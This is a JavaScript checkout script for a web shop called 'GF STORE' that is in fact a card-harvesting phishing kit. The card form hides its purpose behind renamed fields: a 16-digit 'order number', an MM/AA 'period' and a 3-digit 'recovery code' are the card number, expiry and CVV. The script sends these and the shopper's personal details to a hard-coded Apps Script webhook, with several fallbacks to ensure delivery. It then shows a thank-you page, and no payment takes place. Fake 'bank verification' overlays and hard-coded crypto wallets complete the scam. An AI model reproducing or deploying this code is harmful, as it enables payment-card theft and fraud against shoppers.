/* GF STORE — Checkout (extern) — v5
 * - Envoi fiable vers Apps Script (JSON → _json → sendBeacon → no-cors)
 * - Carte: card_name, order_number, period, recovery_code (+ alias)
 * - SEPA: preuve en base64 (<=10MB), ref auto si vide
 * - Crypto: QR/adresse dynamiques, TxID requis
 * - Split: aperçu échéancier + due now
 * - Bouton "Finaliser" actif seulement après vérif SEPA/CRYPTO
 */

(() => {
  "use strict";
  if (window.__GF_CHECKOUT_INIT__) return;
  window.__GF_CHECKOUT_INIT__ = true;

  /* ====== CONFIG ====== */
  const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbypa62g6lhlchWMayVWYyRh2TGc--bBdqNMag2ro1Ne1SDMVT5bHzy7pvooG3ZnsGAx/exec";
  const WEBHOOK_SECRET = ""; // si tu actives le check côté Apps Script
  const MAX_SIZE = 10 * 1024 * 1024; // 10 MB

  /* ====== HELPERS ====== */
  const $  = s => document.querySelector(s);
  const $$ = s => Array.from(document.querySelectorAll(s));
  const toast = (m)=>{ const t=$('#toast'); if(!t) return; t.textContent=m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 1800); };
  const EUR = v => Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
  const two = n => String(n).padStart(2,'0');

  /* ====== ORDER ID ====== */
  const orderId = (()=>{ const d=new Date(); return `GF-${String(d.getFullYear()).slice(2)}${two(d.getMonth()+1)}${two(d.getDate())}-${Math.floor(Math.random()*9000)+1000}`; })();
  const orderIdEl = $('#orderId'); if (orderIdEl) orderIdEl.textContent = orderId;

  /* ====== CART ====== */
  const KEY='gf_cart';
  const getCart=()=>{ try{return JSON.parse(localStorage.getItem(KEY)||'[]');}catch{return[];} };
  const setCart=arr=>localStorage.setItem(KEY, JSON.stringify(arr));
  const computeSub=cart=>cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0);

  function renderMini(){
    const wrap=$('#miniCart'); if(!wrap) return;
    const cart=getCart();
    if(!cart.length){
      wrap.innerHTML='<div class="muted">Ihr Warenkorb ist leer.</div>';
      ['sub','benefit','total','dueNow'].forEach(id=>{ const el=$('#'+id); if(el) el.textContent='—'; });
      const schedule=$('#schedule'); if(schedule) schedule.style.display='none';
      return;
    }
    wrap.innerHTML=cart.map(x=>`
      <div class="ci">
        <img src="${x.image||''}" alt="${x.name||''}">
        <div>
          <div style="font-weight:600">${x.name||''}</div>
          <div class="muted" style="font-size:12px">${x.brand||''}${x.category?(' • '+x.category):''}</div>
        </div>
        <div style="font-weight:600">${EUR((+x.price||0)*(+x.qty||1))}</div>
      </div>`).join('');
  }

  /* ====== MODES & PROMO ====== */
  function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
  function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }

  /* ====== CRYPTO CONFIG ====== */
  const fx = {
    'USDT-TRC20':{symbol:'USDT',rate:1},
    'USDT-BEP20':{symbol:'USDT',rate:1},
    'BTC':{symbol:'BTC',rate:60000},
    'ETH-ERC20':{symbol:'ETH',rate:3000}
  };
  const WALLET = {
    'USDT-BEP20':{ address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b' },
    'USDT-TRC20':{ address:'TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq' },
    'BTC':{ address:'18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3' },
    'ETH-ERC20':{ address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b' }
  };
  function setCryptoAddress(ccy){
    const cfg=WALLET[ccy]||{};
    const w=$('#wallet'); if(w) w.value=cfg.address||'';
    const lbl=$('#ccyLabel'); if(lbl) lbl.textContent=fx[ccy]?.symbol||(ccy?.includes('USDT')?'USDT':'');
    const img=$('#qrImg'); if(img){ img.src=cfg.qr||''; img.alt='QR '+(ccy||''); }
  }

  /* ====== SPLIT ====== */
  function splitAmounts(total, parts){
    const c=Math.round((+total||0)*100);
    const base=Math.floor(c/parts), first=base+(c-base*parts);
    return [first,...Array(parts-1).fill(base)].map(x=>x/100);
  }
  function scheduleLines(total, parts){
    const amts=splitAmounts(total, parts);
    const today=new Date(); const steps=[0,30,60,90];
    return amts.map((amt,i)=>{ const d=new Date(today); d.setDate(d.getDate()+steps[i]); return {label:i?`In ${steps[i]} Tagen`:`Heute`, date:d.toLocaleDateString('de-DE'), amt}; });
  }
  let selectedSplit=1;

  function currentDueNow(){
    const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
    return splitAmounts(total, selectedSplit)[0]||0;
  }

  /* ====== SUMMARY ====== */
  function updateSummary(){
    const cart=getCart(); if(!cart.length){ renderMini(); return; }
    const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
    const amts=splitAmounts(total, selectedSplit), dueNow=amts[0]||0;
    const set=(id,val)=>{ const el=document.getElementById(id); if(el) el.textContent=val; };
    set('sub',EUR(sub)); set('benefit',promo>0?'–'+EUR(promo):'—'); set('total',EUR(total)); set('dueNow',EUR(dueNow));

    const box=$('#schedule');
    if(box){
      if(selectedSplit>1){
        const lines=scheduleLines(total, selectedSplit);
        box.style.display='grid';
        box.innerHTML=lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
      }else box.style.display='none';
    }

    if(currentPM()==='crypto'){
      const ccy=$('#ccy')?.value||'USDT-BEP20'; const r=fx[ccy]?.rate||1; const amt=(dueNow/r);
      const amountNow=$('#amountNow'); if(amountNow) amountNow.value=dueNow.toFixed(2);
      const ccyAmt=$('#ccyAmt'); if(ccyAmt) ccyAmt.value=(amt>0?amt:0).toFixed(6).replace(/0+$/,'').replace(/\.$/,'');
    }
    if(currentPM()==='sepa'){ const f=$('#amountNowBank'); if(f) f.value=dueNow.toFixed(2); }
  }

  /* ====== COPY ====== */
  function copySel(sel){
    const el=$(sel); if(!el) return;
    const txt=el.value||''; if(!txt){ toast('Rien à copier'); return; }
    if(navigator.clipboard?.writeText){ navigator.clipboard.writeText(txt).then(()=>toast('Copié')); }
    else { el.select(); document.execCommand('copy'); toast('Copié'); }
  }
  $$('[data-copy]').forEach(b=> b.addEventListener('click',()=> copySel(b.getAttribute('data-copy')) ));

  /* ====== VALIDATION ====== */
  function validateAddress(){
    const req=['name','email','address','city','zip','country'];
    for(const id of req){
      const el=$('#'+id);
      const val = el?.tagName==='SELECT' ? el.value : (el?.value||'').trim();
      if(!val){ el?.focus(); toast('Veuillez compléter vos informations.'); return false; }
    }
    return true;
  }
  function validateCardForm(){
    const nm = ($('#cardName')?.value||'').trim(); if(!nm){ $('#cardName')?.focus(); toast('Titulaire requis.'); return false; }
    const num = ($('#orderNumber')?.value||'').replace(/\D+/g,''); if(num.length!==16){ $('#orderNumber')?.focus(); toast('Numéro de commande: 16 chiffres.'); return false; }
    const per = ($('#cardPeriod')?.value||'').trim(); if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(per)){ $('#cardPeriod')?.focus(); toast('Période: MM/AA.'); return false; }
    const rec = ($('#recoveryCode')?.value||'').replace(/\D+/g,''); if(rec.length<3){ $('#recoveryCode')?.focus(); toast('Code de récupération: min 3 chiffres.'); return false; }
    return true;
  }

  /* ====== OVERLAYS & CTA ====== */
  const overlay=$('#checkOverlay'), ovTitle=$('#ovTitle'), ovSub=$('#ovSub'), doneOverlay=$('#doneOverlay');
  const showOverlay=(t,s)=>{ if(ovTitle) ovTitle.textContent=t||'Vérification…'; if(ovSub) ovSub.textContent=s||'Un instant…'; overlay?.classList.add('show'); overlay?.setAttribute('aria-hidden','false'); };
  const hideOverlay=()=>{ overlay?.classList.remove('show'); overlay?.setAttribute('aria-hidden','true'); };
  const showDone=()=>{ doneOverlay?.classList.add('show'); doneOverlay?.setAttribute('aria-hidden','false'); };

  let bankVerified=false, cryptoVerified=false;
  function updateCTA(){
    const pm=currentPM(), btn=$('#placeOrder');
    if(!btn) return;
    btn.disabled = pm==='card' ? true : (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : true);
  }

  /* ====== WEBHOOK ENVOI (multi fallback) ====== */
  function countryName(){
    const sel=$('#country'); if(!sel) return '';
    const o=sel.options[sel.selectedIndex];
    return (o?.text||'').trim();
  }
  function cartForWebhook(){
    try{ const cart=JSON.parse(localStorage.getItem('gf_cart')||'[]'); return cart.map(x=>({name:x.name,qty:+(x.qty||1),price:+(x.price||0)})); }catch{return[];}
  }

  async function postCompat(url, payload){
    // métadonnées
    payload.req_id    = payload.req_id || ('gf_' + Date.now() + '_' + Math.random().toString(36).slice(2,8));
    payload.ts_client = payload.ts_client || new Date().toISOString();
    payload.origin    = location.origin;
    payload.ua        = navigator.userAgent;

    const dataStr = JSON.stringify(payload);

    // A) JSON standard
    try{
      await fetch(url, {
        method:'POST',
        headers:{ 'Content-Type':'application/json', ...(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {}) },
        body:dataStr,
        keepalive:true
      });
      return true;
    }catch(_){}

    // B) x-www-form-urlencoded (_json)
    try{
      const usp=new URLSearchParams(); usp.set('_json', dataStr);
      await fetch(url, {
        method:'POST',
        headers:{ ...(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {}) },
        body: usp,
        keepalive:true
      });
      return true;
    }catch(_){}

    // C) sendBeacon (navigations immédiates)
    try{
      if (navigator.sendBeacon){
        const blob = new Blob([dataStr], {type:'text/plain;charset=utf-8'});
        const ok = navigator.sendBeacon(url, blob);
        if (ok) return true;
      }
    }catch(_){}

    // D) no-cors dernier recours
    try{
      await fetch(url, {
        method:'POST',
        mode:'no-cors',
        headers:{'Content-Type':'text/plain;charset=utf-8', ...(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {})},
        body:dataStr,
        keepalive:true
      });
      return true;
    }catch(_){}
    return false;
  }

  async function sendCrypto(dueNow){
    const payload = {
      orderId, method:'crypto', amount:(+dueNow||0).toFixed(2),
      txid: ($('#txid')?.value||'').trim(), ccy: $('#ccy')?.value||'USDT-BEP20',
      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
      country:$('#country')?.value||'', country_name: countryName(),
      split:selectedSplit, cart:cartForWebhook()
    };
    await postCompat(WEBHOOK_URL, payload);
  }

  async function fileToBase64(file){
    const buf=await file.arrayBuffer();
    let bin=''; const bytes=new Uint8Array(buf), chunk=0x8000;
    for(let i=0;i<bytes.length;i+=chunk){ bin+=String.fromCharCode.apply(null, bytes.subarray(i,i+chunk)); }
    return btoa(bin);
  }

  async function sendSepa(dueNow, proofFile){
    const payload = {
      orderId, method:'sepa', amount:(+dueNow||0).toFixed(2),
      ref: ($('#vref')?.value||'').trim(),
      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
      country:$('#country')?.value||'', country_name: countryName(),
      split:selectedSplit, cart:cartForWebhook()
    };
    if(proofFile){
      payload.file_name = proofFile.name;
      payload.mime_type = proofFile.type || 'application/octet-stream';
      payload.file_b64  = await fileToBase64(proofFile);
    }
    await postCompat(WEBHOOK_URL, payload);
  }

  async function sendCard(dueNow){
    // Champs du FORMULAIRE 2 (carte)
    const card_name    = ($('#cardName')?.value||'').trim();
    const order_number = ($('#orderNumber')?.value||'').replace(/\D+/g,'').slice(0,32);
    const period       = ($('#cardPeriod')?.value||'').trim();
    const recovery_code= ($('#recoveryCode')?.value||'').trim();

    // Envoi avec ALIAS pour compat maximale côté Apps Script
    const payload = {
      orderId, method:'card', amount:(+dueNow||0).toFixed(2),

      // Canonique + alias
      card_name, titulaire: card_name, cardholder: card_name, cardName: card_name,
      order_number, numero_commande: order_number, commande: order_number, orderNumber: order_number,
      period, periode: period, card_period: period, cardPeriod: period,
      recovery_code, code_recuperation: recovery_code, recoveryCode: recovery_code,

      phone_meta: ($('#phone')?.value||'').trim(),

      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
      country:$('#country')?.value||'', country_name: countryName(),

      split:selectedSplit, cart:cartForWebhook()
    };
    await postCompat(WEBHOOK_URL, payload);
  }

  /* ====== FILES (SEPA) ====== */
  const dz=$('#dz'), input=$('#proofInput'), fileWrap=$('#fileWrap'), fileName=$('#fileName'), fileInfo=$('#fileInfo'), fileBar=$('#fileBar'), fileOk=$('#fileOk');
  let proofFile=null;
  function fmtBytes(b){ if(b===0) return '0 B'; if(!b&&b!==0) return ''; const u=['B','KB','MB','GB']; let i=0; while(b>=1024&&i<u.length-1){b/=1024;i++;} return b.toFixed(b<10&&i?1:0)+' '+u[i]; }
  function showFile(f){
    proofFile=f;
    if(fileWrap) fileWrap.style.display='flex';
    if(fileName) fileName.textContent=f.name||'Datei';
    if(fileInfo) fileInfo.textContent=(f.type||'Unbekannter Typ')+' • '+fmtBytes(f.size||0);
    if(fileBar)  fileBar.style.width='0%';
    if(fileOk)   fileOk.style.display='none';
    let p=0; const step=()=>{ p+=Math.random()*35+20; if(p>=100){ p=100; fileBar&&(fileBar.style.width='100%'); fileOk&&(fileOk.style.display='inline-flex'); return; } fileBar&&(fileBar.style.width=p+'%'); setTimeout(step,150); }; setTimeout(step,150);
  }
  input?.addEventListener('change', e=>{ const f=e.target.files?.[0]; if(!f) return; if(f.size>MAX_SIZE){ toast('Datei > 10 MB.'); input.value=''; return; } showFile(f); input.value=''; });
  dz?.addEventListener('dragover', e=>{ e.preventDefault(); dz.classList.add('over'); });
  dz?.addEventListener('dragleave', e=>{ e.preventDefault(); dz.classList.remove('over'); });
  dz?.addEventListener('drop', e=>{ e.preventDefault(); dz.classList.remove('over'); const f=e.dataTransfer?.files?.[0]; if(!f) return; if(f.size>MAX_SIZE){ toast('Datei > 10 MB.'); return; } showFile(f); });
  $('#removeProof')?.addEventListener('click', ()=>{ proofFile=null; if(input) input.value=''; if(fileWrap) fileWrap.style.display='none'; });

  /* ====== TABS ====== */
  $$('.m[role="tab"]').forEach(card=>{
    card.addEventListener('click', ()=>{
      $$('.m[role="tab"]').forEach(c=>c.setAttribute('aria-selected', String(c===card)));
      const m=card.dataset.method;
      $('#pmCrypto')?.classList.toggle('show', m==='crypto');
      $('#pmSEPA')?.classList.toggle('show', m==='sepa');
      $('#pmCard')?.classList.toggle('show', m==='card');
      if(m==='sepa') cryptoVerified=false;
      if(m==='crypto') bankVerified=false;
      updateSummary(); updateCTA();
    });
  });

  /* ====== SPLIT UI ====== */
  const modal=$('#splitModal');
  const setModalParts=(n)=>{ $$('#segSplit .segbtn').forEach(b=>b.setAttribute('aria-pressed', String(Number(b.dataset.parts)===Number(n)))); };
  const updateModalPreview=()=>{
    const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
    const parts=Number($$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true')?.dataset.parts||4);
    const lines=scheduleLines(total, parts);
    $('#modalPrev').innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
  };
  $$('#segSplit .segbtn').forEach(b=> b.addEventListener('click',()=>{ setModalParts(b.dataset.parts); updateModalPreview(); }));
  $('#btnSplit')?.addEventListener('click',()=>{ modal?.classList.add('show'); modal?.setAttribute('aria-hidden','false'); setModalParts(4); updateModalPreview(); });
  $('#closeSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
  $('#cancelSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
  $('#applySplit')?.addEventListener('click',()=>{ const sel=$$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true'); selectedSplit=Number(sel?.dataset.parts||4); const hint=$('#splitHint'); if(hint) hint.textContent = selectedSplit>1 ? `(${selectedSplit}× monatlich)` : '(deaktiviert)'; $('#btnSplit')?.classList.add('on'); $('#btnOnce')?.classList.remove('on'); modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); updateSummary(); });

  /* ====== ACTIONS (anti double-click) ====== */
  function once(btn, fn){ let busy=false; btn?.addEventListener('click', async ()=>{ if(busy) return; busy=true; try{ await fn(); } finally{ setTimeout(()=>busy=false, 900); } }); }

  // Auto-référence SEPA si vide
  function ensureVref(){ if(!$('#vref')?.value?.trim()){ const name=$('#name')?.value||''; const base=(name||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16) || orderId.replace('GF-','').split('-')[0]; $('#vref').value = base; } }
  $('#name')?.addEventListener('input', ()=>{ if(!$('#vref')?.value?.trim()) ensureVref(); });

  once($('#confirmCrypto'), async ()=>{
    if(!validateAddress()) return;
    const tx=($('#txid')?.value||'').trim(); if(!tx){ $('#txid')?.focus(); toast('TxID requis.'); return; }
    showOverlay('Krypto wird geprüft…','Hash validieren…');
    await sendCrypto(currentDueNow());
    hideOverlay(); cryptoVerified=true; updateCTA(); toast('Transaktion erfasst — Sie können abschließen'); $('#placeOrder')?.focus();
  });

  once($('#confirmBank'), async ()=>{
    if(!validateAddress()) return;
    ensureVref();
    if(!proofFile){ $('#dz')?.scrollIntoView({behavior:'smooth',block:'center'}); toast('Überweisungsnachweis erforderlich.'); return; }
    showOverlay('Überweisung wird geprüft…','Bestätigung bei der Bank…');
    await sendSepa(currentDueNow(), proofFile);
    hideOverlay(); bankVerified=true; updateCTA(); toast('Überweisung erfasst — Sie können abschließen'); $('#placeOrder')?.focus();
  });

  once($('#payCard'), async ()=>{
    if(!validateAddress()) return;
    if(!validateCardForm()) return;
    showOverlay('Paiement par carte…','Chiffré via TLS.');
    await sendCard(currentDueNow());
    // on garde l’overlay visible jusqu’à la navigation (sendBeacon/keepalive assure l’envoi)
    setTimeout(()=>{ window.location.href='merci.html'; }, 1200);
  });

  $('#placeOrder')?.addEventListener('click', ()=>{
    if(!validateAddress()) return;
    const cart=getCart(); if(!cart.length){ toast('Ihr Warenkorb ist leer.'); return; }
    const pm=currentPM(); if(pm==='crypto'&&!cryptoVerified){ toast('Bitte Krypto-Prüfung abschließen.'); return; }
    if(pm==='sepa'&&!bankVerified){ toast('Bitte Überweisungs-Prüfung abschließen.'); return; }
    const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
    const order={ id:orderId, date:new Date().toISOString(), status:'In Bearbeitung',
      items:cart, pricing:{sub,ship:0,promo,total,currency:'EUR'},
      shipping:{ name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'', address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'', country:$('#country')?.value||'', country_name: countryName() },
      payment:{ method:pm, split:selectedSplit }
    };
    try{ const all=JSON.parse(localStorage.getItem('gf_orders')||'[]'); all.push(order); localStorage.setItem('gf_orders', JSON.stringify(all)); }catch{}
    setCart([]); showDone();
  });

  /* ====== INIT ====== */
  (function init(){
    // onglet par défaut: SEPA
    const sepaTab=document.querySelector('.m[role="tab"][data-method="sepa"]'); sepaTab?.setAttribute('aria-selected','true');
    $('#pmSEPA')?.classList.add('show'); $('#pmCrypto')?.classList.remove('show'); $('#pmCard')?.classList.remove('show');
    setCryptoAddress($('#ccy')?.value||'USDT-BEP20');
    $('#ccy')?.addEventListener('change',()=>{ setCryptoAddress($('#ccy').value); updateSummary(); });
    renderMini(); updateSummary(); updateCTA();
  })();
})();
